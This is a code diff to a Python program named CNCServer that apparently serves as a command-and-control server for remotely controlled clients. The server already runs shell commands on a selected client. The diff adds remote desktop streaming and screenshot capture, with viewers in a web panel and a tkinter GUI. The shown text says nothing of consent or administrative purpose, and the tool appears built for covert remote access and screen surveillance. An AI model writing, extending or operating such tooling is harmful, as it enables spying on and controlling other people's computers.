@@ -18,6 +18,7 @@ You can type `help` at the server prompt for available commands.
 from __future__ import annotations
 
 import argparse
+import io
 import json
 import os
 import socket
@@ -62,6 +63,7 @@ class ClientSession:
     info: JsonDict = field(default_factory=dict)
     alive: bool = True
     last_response: JsonDict = field(default_factory=dict)
+    last_desktop_frame: Optional[str] = None  # base64 encoded image
 
 
 class CNCServer:
@@ -122,6 +124,10 @@ class CNCServer:
                 elif mtype == "heartbeat":
                     # Just log briefly; not essential.
                     pass
+                elif mtype == "desktop_frame":
+                    # Store the latest desktop frame
+                    session.last_desktop_frame = msg.get("image")
+                    self._emit_event("desktop_frame", {"id": cid, "image": msg.get("image")})
                 else:
                     print(f"[cnc] From client #{cid}: {msg}")
                     session.last_response = msg
@@ -184,6 +190,9 @@ Commands:
   exec <cmd>            Execute a shell command on the selected client
   cd <path>             Change working directory on the selected client
   pwd                   Print working directory on the selected client
+  desktop_start [fps]   Start remote desktop streaming (default: 5 fps)
+  desktop_stop          Stop remote desktop streaming
+  desktop_frame         Request a single screenshot
   exit_client           Ask the selected client to exit
   quit                  Quit this CNC server
 """.strip()
@@ -273,6 +282,40 @@ Commands:
                 selected_id = None
                 continue
             send_json_line(session.sock, {"type": "pwd"})
+        elif cmd == "desktop_start":
+            if selected_id is None:
+                print("No client selected. Use `list` and `use <id>` first.")
+                continue
+            session = server.get_client(selected_id)
+            if session is None:
+                print("Selected client is no longer connected.")
+                selected_id = None
+                continue
+            fps = float(arg) if arg else 5.0
+            send_json_line(session.sock, {"type": "desktop_start", "fps": fps})
+            print(f"[cnc] Started remote desktop streaming at {fps} fps")
+        elif cmd == "desktop_stop":
+            if selected_id is None:
+                print("No client selected. Use `list` and `use <id>` first.")
+                continue
+            session = server.get_client(selected_id)
+            if session is None:
+                print("Selected client is no longer connected.")
+                selected_id = None
+                continue
+            send_json_line(session.sock, {"type": "desktop_stop"})
+            print("[cnc] Stopped remote desktop streaming")
+        elif cmd == "desktop_frame":
+            if selected_id is None:
+                print("No client selected. Use `list` and `use <id>` first.")
+                continue
+            session = server.get_client(selected_id)
+            if session is None:
+                print("Selected client is no longer connected.")
+                selected_id = None
+                continue
+            send_json_line(session.sock, {"type": "desktop_frame"})
+            print("[cnc] Requested screenshot")
         elif cmd == "exit_client":
             if selected_id is None:
                 print("No client selected. Use `list` and `use <id>` first.")
@@ -386,6 +429,10 @@ def run_web(server: CNCServer, web_host: str, web_port: int) -> None:
         .status.connected { background: #4CAF50; color: white; }
         .status.disconnected { background: #f44336; color: white; }
         .command-group { display: flex; gap: 10px; margin-top: 10px; }
+        .desktop-viewer { background: #000; border: 2px solid #555; border-radius: 5px; padding: 10px; margin-top: 15px; }
+        .desktop-viewer img { max-width: 100%; height: auto; display: block; margin: 0 auto; border: 1px solid #555; }
+        .desktop-controls { display: flex; gap: 10px; margin-top: 10px; flex-wrap: wrap; }
+        .desktop-info { color: #aaa; font-size: 0.9em; margin-top: 10px; }
     </style>
 </head>
 <body>
@@ -406,6 +453,24 @@ def run_web(server: CNCServer, web_host: str, web_port: int) -> None:
             <h2>Control Panel</h2>
             <div id="control-panel">
                 <p style="color: #aaa;">Select a client to control</p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Remote Desktop</h2>
+            <div id="desktop-viewer" class="desktop-viewer" style="display: none;">
+                <div class="desktop-controls">
+                    <button class="btn-success" onclick="sendCommand('desktop_start')">Start Streaming</button>
+                    <button class="btn-danger" onclick="sendCommand('desktop_stop')">Stop Streaming</button>
+                    <button class="btn-primary" onclick="sendCommand('desktop_frame')">Single Screenshot</button>
+                    <input type="number" id="desktop-fps" value="5" min="1" max="30" step="1" style="width: 80px; padding: 10px; border: 1px solid #555; border-radius: 5px; background: #333; color: #e0e0e0;">
+                    <label style="color: #aaa;">FPS</label>
+                </div>
+                <div id="desktop-info" class="desktop-info">No desktop stream active</div>
+                <img id="desktop-image" src="" alt="Remote Desktop" style="display: none;">
+            </div>
+            <div id="desktop-placeholder" style="color: #aaa; padding: 20px; text-align: center;">
+                Select a client and start remote desktop to view their screen
             </div>
         </div>
 
@@ -452,6 +517,17 @@ def run_web(server: CNCServer, web_host: str, web_port: int) -> None:
 
         socket.on('client_response', (data) => {
             addOutput(`[Client #${data.id}] ${JSON.stringify(data.response, null, 2)}`);
+        });
+
+        socket.on('desktop_frame', (data) => {
+            if (data.id === selectedClientId && data.image) {
+                const img = document.getElementById('desktop-image');
+                img.src = 'data:image/jpeg;base64,' + data.image;
+                img.style.display = 'block';
+                document.getElementById('desktop-viewer').style.display = 'block';
+                document.getElementById('desktop-placeholder').style.display = 'none';
+                document.getElementById('desktop-info').textContent = 'Streaming active - Last frame received';
+            }
         });
 
         // Periodic refresh as fallback
@@ -503,6 +579,8 @@ def run_web(server: CNCServer, web_host: str, web_port: int) -> None:
             const panel = document.getElementById('control-panel');
             if (selectedClientId === null) {
                 panel.innerHTML = '<p style="color: #aaa;">Select a client to control</p>';
+                document.getElementById('desktop-viewer').style.display = 'none';
+                document.getElementById('desktop-placeholder').style.display = 'block';
                 return;
             }
 
@@ -522,6 +600,8 @@ def run_web(server: CNCServer, web_host: str, web_port: int) -> None:
                     <button class="btn-success" onclick="sendCommand('cd', document.getElementById('cd-path').value)">Change Directory</button>
                 </div>
             `;
+            document.getElementById('desktop-viewer').style.display = 'block';
+            document.getElementById('desktop-placeholder').style.display = 'none';
         }
 
         function sendCommand(cmd, arg = '') {
@@ -529,8 +609,14 @@ def run_web(server: CNCServer, web_host: str, web_port: int) -> None:
                 addOutput('[Error] No client selected');
                 return;
             }
-            socket.emit('command', {client_id: selectedClientId, command: cmd, argument: arg});
-            addOutput(`[Command] Client #${selectedClientId}: ${cmd} ${arg}`);
+            if (cmd === 'desktop_start') {
+                const fps = document.getElementById('desktop-fps') ? parseFloat(document.getElementById('desktop-fps').value) : 5;
+                socket.emit('command', {client_id: selectedClientId, command: cmd, argument: fps.toString()});
+                addOutput(`[Command] Client #${selectedClientId}: ${cmd} (${fps} fps)`);
+            } else {
+                socket.emit('command', {client_id: selectedClientId, command: cmd, argument: arg});
+                addOutput(`[Command] Client #${selectedClientId}: ${cmd} ${arg}`);
+            }
         }
 
         function addOutput(text) {
@@ -585,6 +671,13 @@ def run_web(server: CNCServer, web_host: str, web_port: int) -> None:
                 send_json_line(session.sock, {"type": "cd", "path": argument})
             elif command == 'pwd':
                 send_json_line(session.sock, {"type": "pwd"})
+            elif command == 'desktop_start':
+                fps = float(argument) if argument else 5.0
+                send_json_line(session.sock, {"type": "desktop_start", "fps": fps})
+            elif command == 'desktop_stop':
+                send_json_line(session.sock, {"type": "desktop_stop"})
+            elif command == 'desktop_frame':
+                send_json_line(session.sock, {"type": "desktop_frame"})
             elif command == 'exit':
                 send_json_line(session.sock, {"type": "exit"})
             else:
@@ -620,6 +713,12 @@ def run_web(server: CNCServer, web_host: str, web_port: int) -> None:
                     socketio.emit('client_response', data, broadcast=True, namespace='/')
             except Exception as e:
                 print(f"[cnc] Error emitting client_response: {e}")
+        if event_type == 'desktop_frame':
+            try:
+                with app.app_context():
+                    socketio.emit('desktop_frame', data, broadcast=True, namespace='/')
+            except Exception as e:
+                print(f"[cnc] Error emitting desktop_frame: {e}")
 
     server.register_event_callback(on_event)
 
@@ -633,6 +732,7 @@ def run_gui(server: CNCServer) -> None:
     try:
         import tkinter as tk
         from tkinter import ttk, scrolledtext, messagebox
+        import io
     except ImportError:
         print("[cnc] ERROR: tkinter is required for GUI mode.")
         print("[cnc] tkinter should be included with Python, but may need to be installed separately on Linux.")
@@ -761,6 +861,24 @@ def run_gui(server: CNCServer) -> None:
     cd_entry.bind('<Return>', lambda e: send_command("cd", cd_entry.get()))
     ttk.Button(cmd_frame, text="CD", command=lambda: send_command("cd", cd_entry.get())).pack(side=tk.LEFT, padx=2)
 
+    # Desktop frame
+    desktop_frame = ttk.Frame(root, padding=10)
+    desktop_frame.pack(fill=tk.BOTH, expand=True)
+
+    ttk.Label(desktop_frame, text="Remote Desktop", font=('Arial', 10, 'bold')).pack(anchor=tk.W)
+    
+    desktop_controls = ttk.Frame(desktop_frame)
+    desktop_controls.pack(fill=tk.X, pady=5)
+    
+    ttk.Button(desktop_controls, text="Start Streaming", command=lambda: send_command("desktop_start", "5")).pack(side=tk.LEFT, padx=2)
+    ttk.Button(desktop_controls, text="Stop Streaming", command=lambda: send_command("desktop_stop")).pack(side=tk.LEFT, padx=2)
+    ttk.Button(desktop_controls, text="Screenshot", command=lambda: send_command("desktop_frame")).pack(side=tk.LEFT, padx=2)
+    
+    desktop_image_label = ttk.Label(desktop_frame, text="No desktop stream active")
+    desktop_image_label.pack(fill=tk.BOTH, expand=True, pady=5)
+    
+    desktop_photo = None
+
     # Output frame
     output_frame = ttk.Frame(root, padding=10)
     output_frame.pack(fill=tk.BOTH, expand=True)
@@ -777,6 +895,25 @@ def run_gui(server: CNCServer) -> None:
             response = data.get('response', {})
             root.after(0, lambda: output_text.insert(tk.END, f"[{cid}] Response: {json.dumps(response, indent=2)}\n"))
             root.after(0, lambda: output_text.see(tk.END))
+        elif event_type == 'desktop_frame':
+            cid = data.get('id', 0)
+            if cid == selected_id.get() and data.get('image'):
+                try:
+                    import base64
+                    from PIL import Image, ImageTk
+                    img_data = base64.b64decode(data['image'])
+                    img = Image.open(io.BytesIO(img_data))
+                    # Resize if too large
+                    max_width = 800
+                    if img.width > max_width:
+                        ratio = max_width / img.width
+                        new_height = int(img.height * ratio)
+                        img = img.resize((max_width, new_height), Image.Resampling.LANCZOS)
+                    global desktop_photo
+                    desktop_photo = ImageTk.PhotoImage(img)
+                    desktop_image_label.config(image=desktop_photo, text="")
+                except Exception as e:
+                    desktop_image_label.config(image="", text=f"Error displaying image: {e}")
 
     server.register_event_callback(on_event)
 
